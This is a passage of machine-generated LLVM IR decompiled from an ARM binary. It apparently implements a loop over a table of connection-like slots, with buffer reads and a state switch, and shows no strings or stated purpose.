  %v5_114d8 = icmp slt i32 %v0_114d4, %v3_114b4
  br i1 %v5_114d8, label %bb308, label %bb309

bb308:                                            ; preds = %dec_label_pc_114b4
  store i32 %v3_114b4, i32* @r5, align 4
  br label %bb309

bb309:                                            ; preds = %dec_label_pc_114b4, %bb308
  store i32 %v8_114d0, i32* %v2_114c8, align 4
  br label %bb307

dec_label_pc_114e4:                               ; preds = %dec_label_pc_11418
  %v1_114e4 = add i32 %v2_11490, 4
  %v2_114e4 = inttoptr i32 %v1_114e4 to i32*
  %v3_114e4 = load i32, i32* %v2_114e4, align 4
  store i32 %v3_114e4, i32* %r0.global-to-local, align 4
  %v1_114e8 = call i32 @function_1369c(i32 %v3_114e4)
  store i32 %v1_114e8, i32* %r0.global-to-local, align 4
  %v0_114ec = load i32, i32* @r4, align 4
  %v1_114ec = add i32 %v0_114ec, 12
  %v2_114ec = inttoptr i32 %v1_114ec to i32*
  %v3_114ec = load i32, i32* %v2_114ec, align 4
  store i32 %v3_114ec, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_114f4 = icmp ugt i32 %v3_114ec, 1
  store i1 %v2_114f4, i1* %cpsr_c.global-to-local, align 1
  %v7_114f4 = icmp eq i32 %v3_114ec, 2
  store i1 %v7_114f4, i1* %cpsr_z.global-to-local, align 1
  %v2_114f8 = add i32 %v0_114ec, 4
  %v3_114f8 = inttoptr i32 %v2_114f8 to i32*
  store i32 -1, i32* %v3_114f8, align 4
  %v2_114fc = xor i1 %v2_114f4, true
  %v3_114fc = or i1 %v7_114f4, %v2_114fc
  br i1 %v3_114fc, label %dec_label_pc_12144, label %dec_label_pc_11500

dec_label_pc_11500:                               ; preds = %dec_label_pc_114e4
  %v0_11500 = load i32, i32* @r4, align 4
  %v1_11500 = add i32 %v0_11500, 284
  %v2_11500 = inttoptr i32 %v1_11500 to i8*
  %v3_11500 = load i8, i8* %v2_11500, align 1
  %v4_11500 = zext i8 %v3_11500 to i32
  %v1_11504 = add nuw nsw i32 %v4_11500, 1
  %v1_11508 = urem i32 %v1_11504, 256
  store i32 %v1_11508, i32* %r3.global-to-local, align 4
  %v2_1150c = icmp ugt i32 %v1_11508, 9
  store i1 %v2_1150c, i1* %cpsr_c.global-to-local, align 1
  %v7_1150c = icmp eq i32 %v1_11508, 10
  store i1 %v7_1150c, i1* %cpsr_z.global-to-local, align 1
  %v1_11510 = trunc i32 %v1_11504 to i8
  store i8 %v1_11510, i8* %v2_11500, align 1
  %v0_11514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11514, label %dec_label_pc_12144, label %dec_label_pc_11518

dec_label_pc_11518:                               ; preds = %dec_label_pc_11500
  %v0_11518 = load i32, i32* @r4, align 4
  store i32 %v0_11518, i32* @r0, align 4
  %v0_1151c = call i32 @function_106a4()
  store i32 %v0_1151c, i32* %r0.global-to-local, align 4
  br label %bb307

dec_label_pc_11524:                               ; preds = %bb307
  store i32 1, i32* %stack_var_-64, align 4
  %v0_1152c = load i32, i32* @r6, align 4
  %v1_1152c = load i32, i32* @r5, align 4
  %v3_1152c = icmp uge i32 %v0_1152c, %v1_1152c
  store i1 %v3_1152c, i1* %cpsr_c.global-to-local, align 1
  %v9_1152c = icmp eq i32 %v0_1152c, %v1_1152c
  store i1 %v9_1152c, i1* %cpsr_z.global-to-local, align 1
  %v5_11530 = icmp slt i32 %v0_1152c, %v1_1152c
  %storemerge75 = select i1 %v5_11530, i32 %v1_1152c, i32 %v0_1152c
  %v2_11544 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_11544, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1154c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_1154c, i32* %ip.global-to-local, align 4
  %v2_11550 = ptrtoint i32* %stack_var_-220 to i32
  store i32 %v2_11550, i32* %r1.global-to-local, align 4
  %v1_11554 = add i32 %storemerge75, 1
  store i32 %v1_11554, i32* %r0.global-to-local, align 4
  %v5_11560 = call i32 @function_138bc(i32 %v1_11554, i32 %v2_11550, i32 %v2_11544, i32 0, i32 %v2_1154c)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_11568 = call i32 @function_1396c(i32* null)
  store i32 ptrtoint (i32* @global_var_1ec70.185 to i32), i32* %lr.global-to-local, align 4
  store i32 %v2_11568, i32* @global_var_1ec70.185, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v2_11730 = inttoptr i32 %stack_var_-1868.0 to i32*
  %v2_117d8 = ptrtoint i32* %stack_var_-41 to i32
  %v2_11fc8 = ptrtoint i32* %stack_var_-84 to i32
  %v2_11fd0 = ptrtoint i32* %stack_var_-73 to i32
  %v2_11b44 = ptrtoint i32* %stack_var_-56 to i32
  %v2_11bf8 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_115bc

dec_label_pc_11584:                               ; preds = %dec_label_pc_115e0, %dec_label_pc_12154
  %v0_11598 = phi i32 [ %v3_115d4, %dec_label_pc_115e0 ], [ %v0_11584.pre, %dec_label_pc_12154 ]
  %v3_11584 = udiv i32 %v0_11598, 32
  %v3_11588 = mul nuw nsw i32 %v3_11584, 4
  store i32 %v2_114c0, i32* @lr, align 4
  %v2_11590 = add i32 %v3_11588, %v2_114c0
  store i32 %v2_11590, i32* %r3.global-to-local, align 4
  %v1_11594 = add i32 %v2_11590, -184
  %v2_11594 = inttoptr i32 %v1_11594 to i32*
  %v3_11594 = load i32, i32* %v2_11594, align 4
  %v1_11598 = urem i32 %v0_11598, 32
  store i32 %v1_11598, i32* %r1.global-to-local, align 4
  %v2_1159c = add nsw i32 %v1_11598, -1
  %v3_1159c = shl i32 1, %v2_1159c
  %v4_1159c = and i32 %v3_1159c, %v3_11594
  %v5_1159c = icmp ne i32 %v4_1159c, 0
  store i1 %v5_1159c, i1* %cpsr_c.global-to-local, align 1
  %v6_1159c = lshr i32 %v3_11594, %v1_11598
  store i32 %v6_1159c, i32* %r2.global-to-local, align 4
  %v1_115a0 = urem i32 %v6_1159c, 2
  %v2_115a0 = icmp eq i32 %v1_115a0, 0
  store i1 %v2_115a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115a0, label %dec_label_pc_115a8, label %dec_label_pc_1170c.preheader

dec_label_pc_1170c.preheader:                     ; preds = %dec_label_pc_11584
  %v0_1170c101 = load i32, i32* @r5, align 4
  %v1_1170c102 = add i32 %v0_1170c101, 12
  %v2_1170c103 = inttoptr i32 %v1_1170c102 to i32*
  %v3_1170c104 = load i32, i32* %v2_1170c103, align 4
  store i32 %v3_1170c104, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11710100106 = icmp eq i32 %v3_1170c104, 0
  store i1 %v2_11710100106, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11710100106, label %dec_label_pc_115a8, label %dec_label_pc_11718.lr.ph

dec_label_pc_115a8:                               ; preds = %dec_label_pc_1170c.loopexit, %dec_label_pc_1170c.preheader, %dec_label_pc_11584, %bb344, %dec_label_pc_12070, %dec_label_pc_115bc, %dec_label_pc_12168, %dec_label_pc_120b4
  %v3_115a8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_115a8, i32* %r3.global-to-local, align 4
  %v1_115ac = add i32 %v3_115a8, 1
  store i32 %v1_115ac, i32* %r2.global-to-local, align 4
  %v2_115b0 = icmp ugt i32 %v1_115ac, 254
  store i1 %v2_115b0, i1* %cpsr_c.global-to-local, align 1
  %v7_115b0 = icmp eq i32 %v1_115ac, 255
  store i1 %v7_115b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_115ac, i32* %stack_var_-52, align 4
  %v8_115b8 = icmp sgt i32 %v1_115ac, 255
  br i1 %v8_115b8, label %dec_label_pc_10f50, label %dec_label_pc_115bc

dec_label_pc_115bc:                               ; preds = %dec_label_pc_115a8, %dec_label_pc_11524
  %v0_115c8 = phi i32 [ %v1_115ac, %dec_label_pc_115a8 ], [ 0, %dec_label_pc_11524 ]
  store i32 ptrtoint (i32* @global_var_1ecd4.197 to i32), i32* %ip.global-to-local, align 4
  %v3_115c0 = mul i32 %v0_115c8, 256
  store i32 %v3_115c0, i32* %r3.global-to-local, align 4
  %v2_115c4 = load i32, i32* @global_var_1ecd4.197, align 4
  store i32 %v2_115c4, i32* %r1.global-to-local, align 4
  %v2_115cc = mul i32 %v0_115c8, 288
  store i32 %v2_115cc, i32* %r2.global-to-local, align 4
  %v2_115d0 = add i32 %v2_115c4, %v2_115cc
  store i32 %v2_115d0, i32* @r5, align 4
  %v1_115d4 = add i32 %v2_115d0, 4
  %v2_115d4 = inttoptr i32 %v1_115d4 to i32*
  %v3_115d4 = load i32, i32* %v2_115d4, align 4
  store i32 %v3_115d4, i32* @r4, align 4
  %v2_115d8 = icmp eq i32 %v3_115d4, -1
  store i1 %v2_115d8, i1* %cpsr_c.global-to-local, align 1
  %v7_115d8 = icmp eq i32 %v3_115d4, -1
  store i1 %v7_115d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115d8, label %dec_label_pc_115a8, label %dec_label_pc_115e0

dec_label_pc_115e0:                               ; preds = %dec_label_pc_115bc
  %v3_115e0 = udiv i32 %v3_115d4, 32
  %v3_115e4 = mul nuw nsw i32 %v3_115e0, 4
  store i32 %v2_114c0, i32* %lr.global-to-local, align 4
  %v2_115ec = add i32 %v3_115e4, %v2_114c0
  store i32 %v2_115ec, i32* %r3.global-to-local, align 4
  %v1_115f0 = add i32 %v2_115ec, -312
  %v2_115f0 = inttoptr i32 %v1_115f0 to i32*
  %v3_115f0 = load i32, i32* %v2_115f0, align 4
  %v1_115f4 = urem i32 %v3_115d4, 32
  store i32 %v1_115f4, i32* %r1.global-to-local, align 4
  %v2_115f8 = add nsw i32 %v1_115f4, -1
  %v3_115f8 = shl i32 1, %v2_115f8
  %v4_115f8 = and i32 %v3_115f0, %v3_115f8
  %v5_115f8 = icmp ne i32 %v4_115f8, 0
  store i1 %v5_115f8, i1* %cpsr_c.global-to-local, align 1
  %v6_115f8 = lshr i32 %v3_115f0, %v1_115f4
  store i32 %v6_115f8, i32* %r2.global-to-local, align 4
  %v1_115fc = urem i32 %v6_115f8, 2
  %v2_115fc = icmp eq i32 %v1_115fc, 0
  store i1 %v2_115fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115fc, label %dec_label_pc_11584, label %dec_label_pc_11604

dec_label_pc_11604:                               ; preds = %dec_label_pc_115e0
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  store i32 %v2_11bf8, i32* %r3.global-to-local, align 4
  store i32 %v2_11b44, i32* %ip.global-to-local, align 4
  store i32 %v3_115d4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v6_11634 = call i32 @function_13e44(i32 %v3_115d4, i32 1, i32 4, i32* nonnull %stack_var_-48, i32 %v2_11b44)
  %v3_11638 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_11638, i32* %r3.global-to-local, align 4
  %v2_1163c = or i32 %v3_11638, %v6_11634
  store i32 %v2_1163c, i32* %r0.global-to-local, align 4
  %v4_1163c = icmp eq i32 %v2_1163c, 0
  store i1 %v4_1163c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_1163c, label %dec_label_pc_11644, label %dec_label_pc_12168

dec_label_pc_11644:                               ; preds = %dec_label_pc_11604
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_11648 = load i32, i32* @r5, align 4
  %v2_11648 = add i32 %v1_11648, 12
  %v3_11648 = inttoptr i32 %v2_11648 to i32*
  store i32 2, i32* %v3_11648, align 4
  %v0_1164c = call i32 @function_fe60()
  store i32 %v0_1164c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1ec6c.191 to i32), i32* %r3.global-to-local, align 4
  %v3_11654 = load i8, i8* @global_var_1ec6d.192, align 1
  %v4_11654 = zext i8 %v3_11654 to i32
  store i32 %v4_11654, i32* %r2.global-to-local, align 4
  %v2_11658 = load i8, i8* bitcast (i8** @global_var_1ec6c.191 to i8*), align 4
  %v3_11658 = zext i8 %v2_11658 to i32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_1165c = mul nuw nsw i32 %v4_11654, 256
  %v5_1165c = or i32 %v3_11658, %v4_1165c
  store i32 %v5_1165c, i32* %r1.global-to-local, align 4
  %v2_11660 = call i32 @function_133f8(i32 %v0_1164c, i32 %v5_1165c)
  store i32 ptrtoint (i32* @global_var_1ec3c.187 to i32), i32* %r3.global-to-local, align 4
  %v2_11668 = load i32, i32* @global_var_1ec3c.187, align 4
  store i32 %v2_11668, i32* %lr.global-to-local, align 4
  %v1_11670 = load i32, i32* @r6, align 4
  %v9_11670 = icmp eq i32 %v2_11668, %v1_11670
  store i1 %v9_11670, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_11674 = urem i32 %v2_11660, 65536
  store i32 %v3_11674, i32* %r0.global-to-local, align 4
  %v7_11678 = icmp sgt i32 %v2_11668, %v1_11670
  br i1 %v7_11678, label %dec_label_pc_1167c, label %dec_label_pc_12150

dec_label_pc_1167c:                               ; preds = %dec_label_pc_11644
  %v2_11680 = load i32, i32* @global_var_1ec68.189, align 4
  store i32 %v2_11680, i32* %r3.global-to-local, align 4
  store i32 %v1_11670, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1169c

dec_label_pc_1168c:                               ; preds = %dec_label_pc_116b4, %dec_label_pc_1169c
  %v1_1168c = add i32 %v0_1168c, 1
  store i32 %v1_1168c, i32* %ip.global-to-local, align 4
  %v3_11690 = icmp uge i32 %v1_1168c, %v2_11668
  store i1 %v3_11690, i1* %cpsr_c.global-to-local, align 1
  %v9_11690 = icmp eq i32 %v1_1168c, %v2_11668
  store i1 %v9_11690, i1* %cpsr_z.global-to-local, align 1
  %v1_11694 = add i32 %v0_11694, 16
  store i32 %v1_11694, i32* %r3.global-to-local, align 4
  br i1 %v9_11690, label %dec_label_pc_12150, label %dec_label_pc_1169c

dec_label_pc_1169c:                               ; preds = %dec_label_pc_1168c, %dec_label_pc_1167c
  %v0_1168c = phi i32 [ %v1_1168c, %dec_label_pc_1168c ], [ %v1_11670, %dec_label_pc_1167c ]
  %v0_11694 = phi i32 [ %v1_11694, %dec_label_pc_1168c ], [ %v2_11680, %dec_label_pc_1167c ]
  store i32 %v0_11694, i32* %r1.global-to-local, align 4
  %v1_116a0 = add i32 %v0_11694, 9
  %v2_116a0 = inttoptr i32 %v1_116a0 to i8*
  %v3_116a0 = load i8, i8* %v2_116a0, align 1
  %v4_116a0 = zext i8 %v3_116a0 to i32
  store i32 %v4_116a0, i32* %r2.global-to-local, align 4
  %v1_116a4 = add i32 %v0_11694, 8
  %v2_116a4 = inttoptr i32 %v1_116a4 to i8*
  %v3_116a4 = load i8, i8* %v2_116a4, align 1
  %v4_116a4 = zext i8 %v3_116a4 to i32
  %v4_116a8 = mul nuw nsw i32 %v4_116a0, 256
  %v5_116a8 = or i32 %v4_116a4, %v4_116a8
  store i32 %v5_116a8, i32* %r3.global-to-local, align 4
  %v3_116ac = icmp uge i32 %v5_116a8, %v3_11674
  store i1 %v3_116ac, i1* %cpsr_c.global-to-local, align 1
  %v9_116ac = icmp eq i32 %v5_116a8, %v3_11674
  store i1 %v9_116ac, i1* %cpsr_z.global-to-local, align 1
  %v2_116b0 = xor i1 %v9_116ac, true
  %v3_116b0 = and i1 %v3_116ac, %v2_116b0
  br i1 %v3_116b0, label %dec_label_pc_1168c, label %dec_label_pc_116b4

dec_label_pc_116b4:                               ; preds = %dec_label_pc_1169c
  %v1_116b4 = add i32 %v0_11694, 10
  %v2_116b4 = inttoptr i32 %v1_116b4 to i8*
  %v3_116b4 = load i8, i8* %v2_116b4, align 1
  %v4_116b4 = zext i8 %v3_116b4 to i32
  store i32 %v4_116b4, i32* %r3.global-to-local, align 4
  %v1_116b8 = add i32 %v0_11694, 11
  %v2_116b8 = inttoptr i32 %v1_116b8 to i8*
  %v3_116b8 = load i8, i8* %v2_116b8, align 1
  %v4_116b8 = zext i8 %v3_116b8 to i32
  store i32 %v4_116b8, i32* %r2.global-to-local, align 4
  %v4_116bc = mul nuw nsw i32 %v4_116b8, 256
  %v5_116bc = or i32 %v4_116bc, %v4_116b4
  store i32 %v5_116bc, i32* %r3.global-to-local, align 4
  %v3_116c0 = icmp uge i32 %v5_116bc, %v3_11674
  store i1 %v3_116c0, i1* %cpsr_c.global-to-local, align 1
  %v9_116c0 = icmp eq i32 %v5_116bc, %v3_11674
  store i1 %v9_116c0, i1* %cpsr_z.global-to-local, align 1
  %v2_116c4 = xor i1 %v3_116c0, true
  %v3_116c4 = or i1 %v9_116c0, %v2_116c4
  br i1 %v3_116c4, label %dec_label_pc_1168c, label %dec_label_pc_12154

dec_label_pc_116cc:                               ; preds = %dec_label_pc_119e0, %dec_label_pc_118b0, %dec_label_pc_119fc
  store i32 %v3_118b0, i32* %r1.global-to-local, align 4
  %v0_116d0 = load i32, i32* @sb, align 4
  store i32 %v0_116d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_161dc.326 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_116dc = call i32 @function_12da0(i32 %v0_116d0, i32 %v3_118b0, i32 ptrtoint ([5 x i8]* @global_var_161dc.326 to i32), i32 4)
  store i32 %v5_116dc, i32* %r0.global-to-local, align 4
  %v3_116e0 = icmp eq i32 %v5_116dc, -1
  store i1 %v3_116e0, i1* %cpsr_c.global-to-local, align 1
  %v8_116e0 = icmp eq i32 %v5_116dc, -1
  store i1 %v8_116e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_116dc, i32* @r7, align 4
  br i1 %v3_116e0, label %dec_label_pc_116ec, label %dec_label_pc_11a08

dec_label_pc_116ec:                               ; preds = %dec_label_pc_116cc
  %v0_116ec = load i32, i32* @sb, align 4
  store i32 %v0_116ec, i32* %r0.global-to-local, align 4
  %v0_116f0 = load i32, i32* @r5, align 4
  %v1_116f0 = add i32 %v0_116f0, 24
  %v2_116f0 = inttoptr i32 %v1_116f0 to i32*
  %v3_116f0 = load i32, i32* %v2_116f0, align 4
  store i32 %v3_116f0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_161e4.328 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v5_116fc = call i32 @function_12da0(i32 %v0_116ec, i32 %v3_116f0, i32 ptrtoint ([6 x i8]* @global_var_161e4.328 to i32), i32 5)
  store i32 %v5_116fc, i32* %r0.global-to-local, align 4
  %v3_11700 = icmp eq i32 %v5_116fc, -1
  store i1 %v3_11700, i1* %cpsr_c.global-to-local, align 1
  %v8_11700 = icmp eq i32 %v5_116fc, -1
  store i1 %v8_11700, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_116fc, i32* @r7, align 4
  br i1 %v3_11700, label %dec_label_pc_1170c.loopexit, label %dec_label_pc_11a08

dec_label_pc_1170c.loopexit:                      ; preds = %dec_label_pc_118a0, %dec_label_pc_11de4, %dec_label_pc_11790, %dec_label_pc_116ec, %dec_label_pc_120c0
  %v0_1170c = load i32, i32* @r5, align 4
  %v1_1170c = add i32 %v0_1170c, 12
  %v2_1170c = inttoptr i32 %v1_1170c to i32*
  %v3_1170c = load i32, i32* %v2_1170c, align 4
  store i32 %v3_1170c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11710100 = icmp eq i32 %v3_1170c, 0
  store i1 %v2_11710100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11710100, label %dec_label_pc_115a8, label %dec_label_pc_11718.lr.ph

dec_label_pc_11718.lr.ph:                         ; preds = %dec_label_pc_1170c.preheader, %dec_label_pc_1170c.loopexit
  %v0_11718132 = phi i32 [ %v0_1170c, %dec_label_pc_1170c.loopexit ], [ %v0_1170c101, %dec_label_pc_1170c.preheader ]
  br label %dec_label_pc_11718

dec_label_pc_11710thread-pre-split.thread:        ; preds = %dec_label_pc_11adc, %dec_label_pc_11b90, %dec_label_pc_11c44, %dec_label_pc_11cf8, %dec_label_pc_11f04
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11718

dec_label_pc_11710thread-pre-split:               ; preds = %dec_label_pc_11b24, %dec_label_pc_11bd8, %dec_label_pc_11c8c, %dec_label_pc_11d40, %dec_label_pc_11f4c, %dec_label_pc_11f30, %dec_label_pc_11c70, %dec_label_pc_11d24, %dec_label_pc_11bbc, %dec_label_pc_11b08
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11718

dec_label_pc_11718:                               ; preds = %dec_label_pc_11710thread-pre-split.thread, %dec_label_pc_11710thread-pre-split, %dec_label_pc_11718.lr.ph
  %v0_1210c = phi i32 [ %v0_11718132, %dec_label_pc_11718.lr.ph ], [ %v0_11790, %dec_label_pc_11710thread-pre-split ], [ %v0_11790, %dec_label_pc_11710thread-pre-split.thread ]
  %v1_11718 = add i32 %v0_1210c, 24
  %v2_11718 = inttoptr i32 %v1_11718 to i32*
  %v3_11718 = load i32, i32* %v2_11718, align 4
  store i32 %v3_11718, i32* %r3.global-to-local, align 4
  %v2_1171c = icmp ugt i32 %v3_11718, 255
  store i1 %v2_1171c, i1* %cpsr_c.global-to-local, align 1
  %v7_1171c = icmp eq i32 %v3_11718, 256
  store i1 %v7_1171c, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_1210c, 28
  store i32 %.pre, i32* @sb, align 4
  br i1 %v7_1171c, label %dec_label_pc_1210c, label %dec_label_pc_11728

dec_label_pc_11728:                               ; preds = %dec_label_pc_11718, %dec_label_pc_1210c
  store i32 %stack_var_-1868.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %v2_11730, align 4
  %v0_11734 = load i32, i32* @r5, align 4
  %v1_11734 = add i32 %v0_11734, 24
  %v2_11734 = inttoptr i32 %v1_11734 to i32*
  %v3_11734 = load i32, i32* %v2_11734, align 4
  store i32 %v3_11734, i32* %r2.global-to-local, align 4
  %v0_11738 = load i32, i32* @sb, align 4
  %v2_11738 = add i32 %v0_11738, %v3_11734
  store i32 %v2_11738, i32* @r4, align 4
  %v1_1173c = add i32 %v0_11734, 4
  %v2_1173c = inttoptr i32 %v1_1173c to i32*
  %v3_1173c = load i32, i32* %v2_1173c, align 4
  store i32 %v3_1173c, i32* %r0.global-to-local, align 4
  %v1_11740 = sub i32 256, %v3_11734
  store i32 %v1_11740, i32* %r2.global-to-local, align 4
  store i32 %v2_11738, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1174c = inttoptr i32 %v2_11738 to i32*
  %v5_1174c = call i32 @function_13ea0(i32 %v3_1173c, i32* %v4_1174c, i32 %v1_11740, i32 16384)
  store i32 %v5_1174c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11750 = icmp eq i32 %v5_1174c, 0
  store i1 %v2_11750, i1* %cpsr_z.global-to-local, align 1
  %tmp310 = icmp slt i32 %v5_1174c, 1
  br i1 %tmp310, label %dec_label_pc_12064, label %dec_label_pc_11758

dec_label_pc_11758:                               ; preds = %dec_label_pc_11728
  %v0_11758 = load i32, i32* @r6, align 4
  store i32 %v0_11758, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11760

dec_label_pc_11760:                               ; preds = %bb312, %dec_label_pc_11758
  %v3_11768 = phi i32 [ %v1_1176c, %bb312 ], [ %v0_11758, %dec_label_pc_11758 ]
  %v1_11760 = load i32, i32* @r4, align 4
  %v2_11760 = add i32 %v1_11760, %v3_11768
  %v3_11760 = inttoptr i32 %v2_11760 to i8*
  %v4_11760 = load i8, i8* %v3_11760, align 1
  %v6_11760 = zext i8 %v4_11760 to i32
  store i32 %v6_11760, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11764 = icmp eq i8 %v4_11760, 0
  store i1 %v2_11764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11764, label %bb311, label %bb312

bb311:                                            ; preds = %dec_label_pc_11760
  %v1_11768 = load i32, i32* %r1.global-to-local, align 4
  %v2_11768 = trunc i32 %v1_11768 to i8
  store i8 %v2_11768, i8* %v3_11760, align 1
  %v0_1176c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb312

bb312:                                            ; preds = %dec_label_pc_11760, %bb311
  %v0_1176c = phi i32 [ %v3_11768, %dec_label_pc_11760 ], [ %v0_1176c.pre, %bb311 ]
  %v1_1176c = add i32 %v0_1176c, 1
  store i32 %v1_1176c, i32* %r2.global-to-local, align 4
  %v3_11770 = icmp uge i32 %v5_1174c, %v1_1176c
  store i1 %v3_11770, i1* %cpsr_c.global-to-local, align 1
  %v9_11770 = icmp eq i32 %v5_1174c, %v1_1176c
  store i1 %v9_11770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11770, label %dec_label_pc_11778, label %dec_label_pc_11760

dec_label_pc_11778:                               ; preds = %bb312, %dec_label_pc_12068
  store i32 ptrtoint (i32* @global_var_1ec70.185 to i32), i32* @lr, align 4
  %v0_1177c = load i32, i32* @r5, align 4
  %v1_1177c = add i32 %v0_1177c, 24
  %v2_1177c = inttoptr i32 %v1_1177c to i32*
  %v3_1177c = load i32, i32* %v2_1177c, align 4
  %v2_11780 = load i32, i32* @global_var_1ec70.185, align 4
  store i32 %v2_11780, i32* %r3.global-to-local, align 4
  %v2_11784 = add i32 %v3_1177c, %v5_1174c
  store i32 %v2_11784, i32* %ip.global-to-local, align 4
  store i32 %v2_11784, i32* %v2_1177c, align 4
  %v0_1178c = load i32, i32* %r3.global-to-local, align 4
  %v1_1178c = load i32, i32* @r5, align 4
  %v2_1178c = add i32 %v1_1178c, 8
  %v3_1178c = inttoptr i32 %v2_1178c to i32*
  store i32 %v0_1178c, i32* %v3_1178c, align 4
  br label %dec_label_pc_11790

dec_label_pc_11790:                               ; preds = %dec_label_pc_11ee0, %dec_label_pc_11778
  %v0_11790 = load i32, i32* @r5, align 4
  %v1_11790 = add i32 %v0_11790, 12
  %v2_11790 = inttoptr i32 %v1_11790 to i32*
  %v3_11790 = load i32, i32* %v2_11790, align 4
  store i32 %v3_11790, i32* %r2.global-to-local, align 4
  %v1_11794 = add i32 %v3_11790, -2
  store i32 %v1_11794, i32* %r3.global-to-local, align 4
  %v7_11798 = icmp eq i32 %v1_11794, 8
  store i1 %v7_11798, i1* %cpsr_z.global-to-local, align 1
  %v5_1179c = and i32 %v1_11794, 1073741824
  %v6_1179c = icmp ne i32 %v5_1179c, 0
  store i1 %v6_1179c, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_11790, label %dec_label_pc_1170c.loopexit [
    i32 2, label %dec_label_pc_117c8
    i32 3, label %dec_label_pc_118b0
    i32 4, label %dec_label_pc_11a4c
    i32 5, label %dec_label_pc_11adc
    i32 6, label %dec_label_pc_11b90
    i32 7, label %dec_label_pc_11cf8
    i32 8, label %dec_label_pc_11c44
    i32 9, label %dec_label_pc_11f04
    i32 10, label %dec_label_pc_11dac
  ]

dec_label_pc_117c8:                               ; preds = %dec_label_pc_11790
  %v1_117cc = add i32 %v0_11790, 24
  %v2_117cc = inttoptr i32 %v1_117cc to i32*
  %v3_117cc = load i32, i32* %v2_117cc, align 4
  store i32 %v3_117cc, i32* %ip.global-to-local, align 4
  %v0_117d0 = load i32, i32* @sb, align 4
  store i32 %v0_117d0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v1_117dc = add i32 %v0_11790, 29
  store i32 %v1_117dc, i32* @r4, align 4
  store i32 -3, i32* %sl.global-to-local, align 4
  store i32 -4, i32* @r8, align 4
  %v3_117e891 = icmp eq i32 %v3_117cc, 0
  store i1 %v3_117e891, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_117e891, i1* %cpsr_z.global-to-local, align 1
  %v6_117ec98 = icmp sgt i32 %v3_117cc, 0
  br i1 %v6_117ec98, label %dec_label_pc_117f0.preheader, label %dec_label_pc_11890

dec_label_pc_117e8.loopexit:                      ; preds = %dec_label_pc_11808
  %v2_11810 = add i32 %v1_11810, 2
  store i32 %v2_11810, i32* @r6, align 4
  %v2_11814 = add i32 %v1_11814, 2
  store i32 %v2_11814, i32* @r4, align 4
  %v2_11818 = add i32 %v1_11818, 2
  store i32 %v2_11818, i32* @r7, align 4
  %v3_117e8 = icmp uge i32 %v2_11818, %v1_117e8
  store i1 %v3_117e8, i1* %cpsr_c.global-to-local, align 1
  %v9_117e8 = icmp eq i32 %v2_11818, %v1_117e8
  store i1 %v9_117e8, i1* %cpsr_z.global-to-local, align 1
  %v6_117ec = icmp slt i32 %v2_11818, %v1_117e8
  br i1 %v6_117ec, label %dec_label_pc_117f0.preheader, label %dec_label_pc_11890

dec_label_pc_117f0.preheader:                     ; preds = %dec_label_pc_117c8, %dec_label_pc_117e8.loopexit
  %v6_11898168 = phi i32 [ %v6_11898169, %dec_label_pc_117e8.loopexit ], [ %v0_11790, %dec_label_pc_117c8 ]
